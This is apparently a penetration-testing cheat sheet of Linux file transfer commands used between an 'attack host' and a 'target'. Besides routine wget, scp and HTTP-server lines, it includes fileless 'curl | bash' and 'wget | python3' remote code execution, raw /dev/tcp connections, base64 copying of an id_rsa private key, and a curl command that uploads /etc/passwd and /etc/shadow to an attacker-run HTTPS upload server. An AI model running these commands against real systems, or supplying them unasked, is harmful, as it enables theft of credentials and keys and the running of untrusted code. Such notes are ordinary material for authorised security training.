---
title: Linux File Transfers
tags: [file-transfer, linux, bash, scp, wget, curl]
---

# Linux File Transfers
> Download and upload methods on Linux targets.

---

## Downloads

### Base64 Decode
```bash
# Verify before transfer
md5sum id_rsa

# Encode on source
cat id_rsa | base64 -w 0; echo

# Decode on target
echo -n '<b64string>' | base64 -d > id_rsa

# Verify after transfer
md5sum id_rsa
```

### wget / curl
```bash
wget <URL> -O /tmp/<file>
curl -o /tmp/<file> <URL>
```

### Fileless — Execute Without Writing to Disk
```bash
curl <URL> | bash
wget -qO- <URL> | python3
```

### /dev/tcp (No Tools Required)
Pure bash — useful when wget/curl aren't available.

```bash
# Connect to web server
exec 3<>/dev/tcp/<IP>/80

# Send HTTP GET request
echo -e "GET /<file> HTTP/1.1\n\n">&3

# Print response (includes the file content)
cat <&3
```

### SSH / SCP
```bash
# Enable SSH if not running
sudo systemctl enable ssh
sudo systemctl start ssh

# Download file from remote host
scp <user>@<IP>:/path/to/file .

# Memory aid: scp <source> <destination>
```

---

## Uploads

### uploadserver (HTTPS)
```bash
# Attack host — install and start HTTPS upload server
sudo python3 -m pip install --user uploadserver

# Generate self-signed certificate
openssl req -x509 -out server.pem -keyout server.pem -newkey rsa:2048 -nodes -sha256 -subj '/CN=server'

# Start server on port 443
mkdir https && cd https
sudo python3 -m uploadserver 443 --server-certificate ~/server.pem
```

```bash
# Target — upload files (--insecure because self-signed cert)
curl -X POST https://<IP>/upload -F 'files=@/etc/passwd' -F 'files=@/etc/shadow' --insecure
```

### Serve Files via Simple HTTP Server
Host files on the target, download from attack host.

```bash
python3 -m http.server         # port 8000
python2.7 -m SimpleHTTPServer  # port 8000
php -S 0.0.0.0:8000
ruby -run -ehttpd . -p8000
```

```bash
# Attack host — pull the file
wget <targetIP>:8000/<file>
```

### SCP Upload
```bash
scp <localfile> <user>@<IP>:/destination/
```
